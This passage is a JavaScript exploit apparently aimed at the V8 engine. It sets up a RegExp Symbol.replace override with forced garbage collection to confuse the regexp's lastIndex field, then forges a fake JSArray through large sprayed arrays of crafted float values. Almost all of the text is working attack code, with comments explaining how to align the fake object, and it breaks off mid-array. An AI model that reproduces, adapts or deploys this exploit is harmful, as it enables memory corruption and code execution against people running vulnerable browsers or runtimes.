class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            // fill up new space external backing store bytes
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }

    hex(i) {
        return i.toString(16).padStart(16, "0");
    }

    breakpoint() {
        this.buf.slice();
    }
}



var helper = new Helpers();

var corrupted_array;
var fake_object_array;

var re = new RegExp('foo', 'g');

var match_object = {};
match_object[0] = {
    toString: function () {
        return "";
    }
};

re.exec = function () {
    helper.mark_sweep_gc();
    delete re.exec; // transition back to initial regexp map
    re.lastIndex = 1073741823; // maximum smi, adding one will result in a HeapNumber
    new Array(0x82); // adjust to align re.lastIndex with our fakeobject
    RegExp.prototype.exec = function () {
        throw ''; // break out of Regexp.replace
    }
    return match_object;
};

try {
    var newstr = re[Symbol.replace]("fooooo", ".$");
} catch (e) { }

helper.scavenge_gc();
helper.mark_sweep_gc();

// Adapt this with your own value to create a fake array object
// fake one_byte_internalized_string
// console.log(helper.pair_i32_to_f64(0x3d5, 0x0));
// console.log(helper.pair_i32_to_f64(0x40000000, 0x61616161));

// fake JSArray PACKED_DOUBLE_ELEMENTS
console.log(helper.pair_i32_to_f64(0x18ece1, 0x6cd));
console.log(helper.pair_i32_to_f64(0x2c3169, 0x10000));

// fake_object_array = [1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309, 1.86926619662186e-310, 8.344026986301506e-309];
// fake_object_array = [4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161, 4.847e-321, 1.2217637043425383e+161]
fake_object_array = [3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 